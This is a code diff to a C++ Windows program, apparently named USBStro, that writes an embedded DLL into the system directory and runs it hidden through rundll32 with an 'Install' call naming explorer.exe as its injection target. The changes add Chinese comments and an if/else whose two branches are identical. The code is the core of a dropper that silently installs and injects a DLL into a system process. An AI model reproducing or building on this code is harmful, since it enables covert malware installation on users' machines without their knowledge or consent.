@@ -12,6 +12,7 @@ const char* g_szInjectTarget = "explorer.exe";
 #endif
 const char* g_szDllname      = "usbstro.dll";
 
+/// 得到临时文件名
 std::string GetTempFilename()
 {
 	TCHAR szTempPath[MAX_PATH+1] = { 0 };
@@ -22,17 +23,25 @@ std::string GetTempFilename()
 	return std::string (szTempPath);
 }
 
+/// 启动USBStro，安装到系统
 void LauchUSBStro()
 {
 	// 启动USBSTRO
 	char szBuf[1024];
-	sprintf(szBuf, "rundll32.exe %s,Install %s",
-	g_szDllname,
-	g_szInjectTarget);
+	if(__argc <= 4) {
+		sprintf(szBuf, "rundll32.exe %s,Install %s",
+		g_szDllname,
+		g_szInjectTarget);
+	}
+	else {
+		sprintf(szBuf, "rundll32.exe %s,Install %s",
+		g_szDllname,
+		g_szInjectTarget);
+	}
 	WinExec(szBuf, SW_HIDE);
 }
 
-// 得到系统文件路径
+/// 得到系统文件路径
 std::string GetSystemPath()
 {
 	CHAR szSysPath[MAX_PATH+1];
@@ -41,6 +50,7 @@ std::string GetSystemPath()
 	return szSysPath;
 }
 
+/// 找到资源中的DLL位置
 HRSRC FindDll()
 {
 	HRSRC hRes = FindResource(0, "#101", "FILE");
@@ -53,6 +63,7 @@ HRSRC FindDll()
 	return 0;
 }
 
+/// 处理参数
 void parseArg()
 {
 	if(__argc < 2) {
@@ -83,6 +94,7 @@ int _tmain(int argc, _TCHAR* argv[])
 			std::string sFile = GetSystemPath();
 			sFile += "\\";
 			sFile += g_szDllname;
+			/// 写入usbstro.dll
 			std::ofstream fout(sFile.c_str(), std::ios::binary);
 			if(!fout.good()) {
 				printf("open file %s failed\n", sFile.c_str());
